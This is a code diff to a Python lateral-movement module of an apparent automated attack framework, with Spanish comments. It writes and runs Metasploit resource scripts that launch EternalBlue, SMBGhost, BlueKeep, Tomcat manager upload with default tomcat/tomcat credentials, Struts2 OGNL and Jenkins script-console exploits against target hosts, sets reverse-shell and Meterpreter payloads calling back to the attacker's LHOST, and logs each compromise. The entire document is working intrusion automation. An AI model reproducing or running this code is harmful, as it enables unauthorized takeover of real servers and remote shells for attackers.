@@ -13,6 +13,7 @@ from typing import Dict, List, Any, Optional
 from pathlib import Path
 import re
 from modules.logging_system import LoggingSystem
+from modules.clean_console import CleanConsole
 
 class LateralMovementModule:
     """Módulo de movimiento lateral en la red"""
@@ -23,6 +24,7 @@ class LateralMovementModule:
         self.targets_config = config['targets']
         self.exploitation_config = config['exploitation']
         self.logging_system = LoggingSystem(config, logger)
+        self.clean_console = CleanConsole(config, logger)
         
         # Resultados del movimiento lateral
         self.results = {
@@ -42,7 +44,55 @@ class LateralMovementModule:
         self.msf_path = self.exploitation_config.get('metasploit_path', '/usr/share/metasploit-framework')
         self.lhost = self.exploitation_config.get('lhost', '')
         self.lport = self.exploitation_config.get('lport', 4444)
+        
+        # Mapeo de payloads compatibles por exploit
+        self.compatible_payloads = {
+            'eternalblue': 'windows/x64/meterpreter/reverse_tcp',
+            'smbghost': 'windows/x64/meterpreter/reverse_tcp',
+            'bluekeep': 'windows/x64/meterpreter/reverse_tcp',
+            'tomcat_manager': 'java/shell/reverse_tcp',
+            'struts2': 'cmd/linux/http/x64/meterpreter/reverse_tcp',
+            'jenkins': 'java/shell/reverse_tcp'
+        }
     
+    def _get_compatible_payload(self, exploit_name: str) -> str:
+        """Obtener payload compatible para un exploit específico"""
+        return self.compatible_payloads.get(exploit_name, 'generic/shell_reverse_tcp')
+    
+    def _check_exploit_success(self, output: str, exploit_name: str) -> bool:
+        """Verificar si el exploit fue exitoso basado en la salida"""
+        success_indicators = [
+            'Meterpreter session',
+            'session opened',
+            'Command shell session',
+            'Shell session',
+            'Connection established',
+            'Exploit completed successfully'
+        ]
+        
+        # Indicadores específicos por exploit
+        exploit_specific = {
+            'eternalblue': ['SMB connection established', 'Target is vulnerable'],
+            'smbghost': ['SMB connection established', 'Target is vulnerable'],
+            'bluekeep': ['RDP connection established', 'Target is vulnerable'],
+            'tomcat_manager': ['Tomcat Manager access', 'WAR file uploaded'],
+            'struts2': ['Struts2 exploit', 'Command executed'],
+            'jenkins': ['Jenkins access', 'Script executed']
+        }
+        
+        # Verificar indicadores generales
+        for indicator in success_indicators:
+            if indicator.lower() in output.lower():
+                return True
+        
+        # Verificar indicadores específicos del exploit
+        if exploit_name in exploit_specific:
+            for indicator in exploit_specific[exploit_name]:
+                if indicator.lower() in output.lower():
+                    return True
+        
+        return False
+
     def _run_command(self, command: List[str], timeout: int = 300, background: bool = False) -> Dict[str, Any]:
         """Ejecutar comando y capturar salida"""
         try:
@@ -261,23 +311,26 @@ class LateralMovementModule:
     def _exploit_eternalblue(self, host: str, port: int) -> Optional[Dict[str, Any]]:
         """Intentar exploit EternalBlue (MS17-010)"""
         try:
-            self.logger.info(f"🔥 Intentando EternalBlue en {host}:{port}")
-            
             # Crear script de Metasploit
             msf_script = self.evidence_dir / "eternalblue.rc"
+            payload = self._get_compatible_payload('eternalblue')
             with open(msf_script, 'w') as f:
                 f.write(f"use exploit/windows/smb/ms17_010_eternalblue\n")
                 f.write(f"set RHOSTS {host}\n")
                 f.write(f"set RPORT {port}\n")
                 f.write(f"set LHOST {self.lhost}\n")
                 f.write(f"set LPORT {self.lport}\n")
-                f.write("set payload windows/meterpreter/reverse_tcp\n")
+                f.write(f"set payload {payload}\n")
                 f.write("exploit -j\n")
                 f.write("exit\n")
             
-            # Ejecutar Metasploit
-            command = ['msfconsole', '-r', str(msf_script)]
-            result = self._run_command(command, timeout=300)
+            # Ejecutar Metasploit con consola limpia
+            result = self.clean_console.run_metasploit_clean(
+                str(msf_script),
+                f"Exploit EternalBlue en {host}:{port}",
+                f"EternalBlue exitoso en {host}",
+                f"EternalBlue falló en {host}"
+            )
             
             exploit_result = {
                 'host': host,
@@ -289,7 +342,7 @@ class LateralMovementModule:
                 'output': result['stdout']
             }
             
-            if result['success'] and ('Meterpreter session' in result['stdout'] or 'session opened' in result['stdout']):
+            if result['success'] and self._check_exploit_success(result['stdout'], 'eternalblue'):
                 exploit_result['success'] = True
                 self.logging_system.log_compromise(
                     host, "ETERNALBLUE_EXPLOIT", exploit_result, "LATERAL_MOVEMENT"
@@ -314,13 +367,14 @@ class LateralMovementModule:
             
             # Crear script de Metasploit
             msf_script = self.evidence_dir / "smbghost.rc"
+            payload = self._get_compatible_payload('smbghost')
             with open(msf_script, 'w') as f:
                 f.write(f"use exploit/windows/smb/cve_2020_0796_smbghost\n")
                 f.write(f"set RHOSTS {host}\n")
                 f.write(f"set RPORT {port}\n")
                 f.write(f"set LHOST {self.lhost}\n")
                 f.write(f"set LPORT {self.lport}\n")
-                f.write("set payload windows/meterpreter/reverse_tcp\n")
+                f.write(f"set payload {payload}\n")
                 f.write("exploit -j\n")
                 f.write("exit\n")
             
@@ -338,7 +392,7 @@ class LateralMovementModule:
                 'output': result['stdout']
             }
             
-            if result['success'] and ('Meterpreter session' in result['stdout'] or 'session opened' in result['stdout']):
+            if result['success'] and self._check_exploit_success(result['stdout'], 'smbghost'):
                 exploit_result['success'] = True
                 self.logging_system.log_compromise(
                     host, "SMBGHOST_EXPLOIT", exploit_result, "LATERAL_MOVEMENT"
@@ -363,13 +417,14 @@ class LateralMovementModule:
             
             # Crear script de Metasploit
             msf_script = self.evidence_dir / "bluekeep.rc"
+            payload = self._get_compatible_payload('bluekeep')
             with open(msf_script, 'w') as f:
                 f.write(f"use exploit/windows/rdp/cve_2019_0708_bluekeep_rce\n")
                 f.write(f"set RHOSTS {host}\n")
-                f.write(f"set RPORT {port}\n")
+                f.write(f"set RPORT 3389\n")
                 f.write(f"set LHOST {self.lhost}\n")
                 f.write(f"set LPORT {self.lport}\n")
-                f.write("set payload windows/meterpreter/reverse_tcp\n")
+                f.write(f"set payload {payload}\n")
                 f.write("exploit -j\n")
                 f.write("exit\n")
             
@@ -387,7 +442,7 @@ class LateralMovementModule:
                 'output': result['stdout']
             }
             
-            if result['success'] and ('Meterpreter session' in result['stdout'] or 'session opened' in result['stdout']):
+            if result['success'] and self._check_exploit_success(result['stdout'], 'bluekeep'):
                 exploit_result['success'] = True
                 self.logging_system.log_compromise(
                     host, "BLUEKEEP_EXPLOIT", exploit_result, "LATERAL_MOVEMENT"
@@ -444,13 +499,16 @@ class LateralMovementModule:
             
             # Crear script de Metasploit
             msf_script = self.evidence_dir / "tomcat_manager.rc"
+            payload = self._get_compatible_payload('tomcat_manager')
             with open(msf_script, 'w') as f:
                 f.write(f"use exploit/multi/http/tomcat_mgr_upload\n")
                 f.write(f"set RHOSTS {host}\n")
                 f.write(f"set RPORT {port}\n")
                 f.write(f"set LHOST {self.lhost}\n")
                 f.write(f"set LPORT {self.lport}\n")
-                f.write("set payload java/meterpreter/reverse_tcp\n")
+                f.write(f"set payload {payload}\n")
+                f.write("set HttpUsername tomcat\n")
+                f.write("set HttpPassword tomcat\n")
                 f.write("exploit -j\n")
                 f.write("exit\n")
             
@@ -468,7 +526,7 @@ class LateralMovementModule:
                 'output': result['stdout']
             }
             
-            if result['success'] and ('Meterpreter session' in result['stdout'] or 'session opened' in result['stdout']):
+            if result['success'] and self._check_exploit_success(result['stdout'], 'tomcat_manager'):
                 exploit_result['success'] = True
                 self.logging_system.log_compromise(
                     host, "TOMCAT_MANAGER_EXPLOIT", exploit_result, "LATERAL_MOVEMENT"
@@ -493,13 +551,14 @@ class LateralMovementModule:
             
             # Crear script de Metasploit
             msf_script = self.evidence_dir / "struts.rc"
+            payload = self._get_compatible_payload('struts2')
             with open(msf_script, 'w') as f:
                 f.write(f"use exploit/multi/http/struts2_content_type_ognl\n")
                 f.write(f"set RHOSTS {host}\n")
                 f.write(f"set RPORT {port}\n")
                 f.write(f"set LHOST {self.lhost}\n")
                 f.write(f"set LPORT {self.lport}\n")
-                f.write("set payload java/meterpreter/reverse_tcp\n")
+                f.write(f"set payload {payload}\n")
                 f.write("exploit -j\n")
                 f.write("exit\n")
             
@@ -517,7 +576,7 @@ class LateralMovementModule:
                 'output': result['stdout']
             }
             
-            if result['success'] and ('Meterpreter session' in result['stdout'] or 'session opened' in result['stdout']):
+            if result['success'] and self._check_exploit_success(result['stdout'], 'struts2'):
                 exploit_result['success'] = True
                 self.logging_system.log_compromise(
                     host, "STRUTS_EXPLOIT", exploit_result, "LATERAL_MOVEMENT"
@@ -542,13 +601,14 @@ class LateralMovementModule:
             
             # Crear script de Metasploit
             msf_script = self.evidence_dir / "jenkins.rc"
+            payload = self._get_compatible_payload('jenkins')
             with open(msf_script, 'w') as f:
                 f.write(f"use exploit/multi/http/jenkins_script_console\n")
                 f.write(f"set RHOSTS {host}\n")
                 f.write(f"set RPORT {port}\n")
                 f.write(f"set LHOST {self.lhost}\n")
                 f.write(f"set LPORT {self.lport}\n")
-                f.write("set payload java/meterpreter/reverse_tcp\n")
+                f.write(f"set payload {payload}\n")
                 f.write("exploit -j\n")
                 f.write("exit\n")
             
@@ -566,7 +626,7 @@ class LateralMovementModule:
                 'output': result['stdout']
             }
             
-            if result['success'] and ('Meterpreter session' in result['stdout'] or 'session opened' in result['stdout']):
+            if result['success'] and self._check_exploit_success(result['stdout'], 'jenkins'):
                 exploit_result['success'] = True
                 self.logging_system.log_compromise(
                     host, "JENKINS_EXPLOIT", exploit_result, "LATERAL_MOVEMENT"
